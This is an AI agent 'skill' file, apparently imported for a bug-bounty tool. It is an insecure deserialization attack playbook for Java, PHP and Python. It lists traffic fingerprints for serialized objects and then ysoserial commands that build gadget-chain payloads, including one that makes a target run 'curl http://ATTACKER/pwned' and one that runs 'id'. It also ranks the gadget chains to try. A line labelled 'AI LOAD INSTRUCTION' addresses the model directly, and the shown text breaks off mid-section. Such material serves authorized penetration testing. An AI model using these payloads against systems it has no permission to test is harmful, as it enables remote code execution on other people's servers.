---
name: deserialization-insecure
description: Insecure deserialization playbook. Use when Java, PHP, or Python applications deserialize untrusted data via ObjectInputStream, unserialize, pickle, or similar mechanisms that may lead to RCE, file access, or privilege escalation.
scope: web2
---
Insecure deserialization playbook. Use when Java, PHP, or Python applications deserialize untrusted data via ObjectInputStream, unserialize, pickle, or similar mechanisms that may lead to RCE, file access, or privilege escalation.

# SKILL: Insecure Deserialization — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert deserialization techniques across Java, PHP, and Python. Covers gadget chain selection, traffic fingerprinting, tool usage (ysoserial, PHPGGC), Shiro/WebLogic/Commons Collections specifics, Phar deserialization, and Python pickle abuse. Base models often miss the distinction between finding the sink and finding a usable gadget chain.


## 1. TRAFFIC FINGERPRINTING — IS IT DESERIALIZATION?

### Java Serialized Objects

| Indicator | Where to Look |
|---|---|
| Hex ac ed 00 05 | Raw binary in request/response body, cookies, POST params |
| Base64 rO0AB | Cookies (rememberMe), hidden form fields, JWT claims |
| Content-Type: application/x-java-serialized-object | HTTP headers |
| T3/IIOP protocol traffic | WebLogic ports (7001, 7002) |

### PHP Serialized Objects

| Indicator | Where to Look |
|---|---|
| O:NUMBER:"ClassName" pattern | POST body, cookies, session files |
| a:NUMBER:{ (array) | Same locations |
| phar:// URI usage | File operations accepting user-controlled paths |

### Python Pickle

| Indicator | Where to Look |
|---|---|
| Hex 80 03 or 80 04 (protocol 3/4) | Binary data in requests, message queues |
| Base64-encoded binary blob | API params, cookies, Redis values |
| pickle.loads / pickle.load in source | Code review / whitebox |

---

## 2. JAVA — GADGET CHAINS AND TOOLS

### ysoserial — Primary Tool

# Generate payload (example: CommonsCollections1 chain with command)
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > payload.bin

# Base64-encode for HTTP transport
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# Common chains to try (ordered by frequency of vulnerable dependency):
# CommonsCollections1-7  — Apache Commons Collections 3.x / 4.x
# Spring1, Spring2       — Spring Framework
# Groovy1               — Groovy
# Hibernate1            — Hibernate
# JBossInterceptors1    — JBoss
# Jdk7u21               — JDK 7u21 (no extra dependency)
# URLDNS                — DNS-only confirmation (no RCE, works everywhere)

### URLDNS — Safe Confirmation Probe

URLDNS triggers a DNS lookup without RCE — safe for confirming deserialization without damage:

java -jar ysoserial.jar URLDNS
...

## References
- Source: https://github.com/yaklang/hack-skills/blob/main/skills/deserialization-insecure/SKILL.md
- License: MIT — Copyright (c) 2026 VillanCh
- Distilled for bbhunter by scripts/import_hack_skills.py
